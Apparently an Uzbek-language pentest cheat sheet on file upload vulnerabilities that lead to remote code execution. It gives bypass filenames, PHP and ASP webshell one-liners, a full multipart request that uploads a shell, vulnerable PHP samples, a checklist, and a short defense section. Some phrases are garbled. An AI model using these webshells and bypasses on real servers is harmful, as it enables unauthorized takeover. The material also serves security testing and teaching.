# File Upload Vulnerabilities → RCE

## 1. Ta'rif
File upload — foydalanuvchi fayl yuklaydi. Xatolar: zararli faylni qabul qilish → RCE, XSS, SSRF (SVG), LFI, malware distribution. Eng muhti — webshell orqali RCE.

## 2. Qayerdan kelib chiqadi
- Extension tekshirish: faqat client (JS `accept`/tip), serverda yo'q yoki zaif
- Whitelist yo'q / blacklist zaif (.php, .php5, .pht, .pHp, .php%00)
- MIME/magic bytes tekshirilmaydi
- Fayllar executable katalogda (document root below) served as PHP
- Nomida path: `../shell.php`, double extension `shell.php.jpg`
- Content-Disposition name / path parametr
- Zip extract path traverse (zip-slip), race (upload + include)
- Uploaded file'ni `include` qilish (image file PHP code)

## 3. Turlari
| Tur | Tavsif |
|-----|--------|
| Extension bypass | .php vs .phtml/.phar/.php3/.php4(...) |
| MIME/Content-Type bypass | `application/x-php` berish |
| Double extension | `shell.php.jpg` (apache `AddHandler`) |
| Null byte (old) | `shell.php%00.jpg` |
| Magic bytes | JPEG header + PHP code → php naqlab complications |
| SV / HTML upload | XSS/SSRF (svg) |
| Zip-slip | `../../shell.php` in zip |
| Filename/path injection | `name="../../shell.php"` |
| Remote upload | RFI/LFI source |

## 4. Metodologiya
1. Upload endpoint + validation'ni tahlil: request'da nima keladi (filename, Content-Type).
2. Sinov:
   - `.php` yuqorisida: `.php5 .phtml .pht .phar .php7 .inc .asis .htaccess`
   - `shell.php.jpg`, `shell.jpg.php`, `shell.php.jpg.php`
   - Double extension + `.htaccess` → AddType
   - `shell.php%00.jpg`, `shell.php\x00.jpg`
   - Upper/mixed case `.PHP .Php`
3. Content-Type/MIME: `x-php`, `image/gif` + header bytes `GIF89a` + code.
4. Multipart filename da path: `filename="../../shell.php"`.
5. Uploaded file qayerda? `http://target/uploads/shell.php` — access.
6. File executable bo'lsa → RCE:
   ```
   POST /upload ... filename="shell.php"
   body: <?php system($_GET['c']); ?>
   GET /uploads/shell.php?c=id
   ```
7. Include-based: file image bo'lsa, LFI bilan include + RCE.
8. SVG: `<script>alert(1)</script>`, XXE.
9. Zip-slip: upload arxivi bilan.

## 5. Payload'lar
```bash
# webshell
<?php system($_GET['c']); ?>
<?=`$_GET[0]`?>
<%eval request("cmd")%>                     # ASP
<% xp_cmdshell %> (MSSQL aspx)
```

## 6. Request misollari
```
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=---------------------abc

-----------------------abc
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['c']); ?>

-----------------------abc--

# Eski PHP null byte
filename="shell.php%00.jpg"

# Double ext
filename="shell.php.jpg"
```

## 7. Zaif code misollari
```php
// ZAIF
$allowed = ['jpg','png','gif'];
$ext = end(explode(".", $_FILES['file']['name']));
if (in_array($ext, $allowed)) move_uploaded_file(...);

// ZAIF — gabi biz jim by magic bytes
if ($_FILES['file']['type'] == 'image/jpeg') ...
```
## 8. Nimalarga ahamiyat berish (checklist)
- [ ] Katalog executable: uploads/ PHP'ni ishlatadimi — `.htaccess`/`nginx config`
- [ ] Extension whitelist'ni bypass: null, case, `.htaccess`, `.user.ini`, `.env`
- [ ] Yükleme dosyasını `include` qilsa — image poisoning RCE
- [ ] Server: apache `AddHandler`, nginx `location ~ \.php`
- [ ] Magic bytes: `GIF89a` prefix + php code
- [ ] Zip-slip
- [ ] Filename quirks: `..`, `/`, unicode, long names (dir traversal)
- [ ] SVG → XSS (script + upload), HTML upload
- [ ] Large file / DoS, file type sniffing (polyglot)

## 9. Himoya
- Extension whitelist (server-side) + content validation (magic bytes) + random filename
- Upload'ni non-executable static katalogda, `Content-Disposition: attachment`
- Allowlist MIME, strip code, antivir scanning, quota/rate
- Never execute uploaded files direkt; file serve static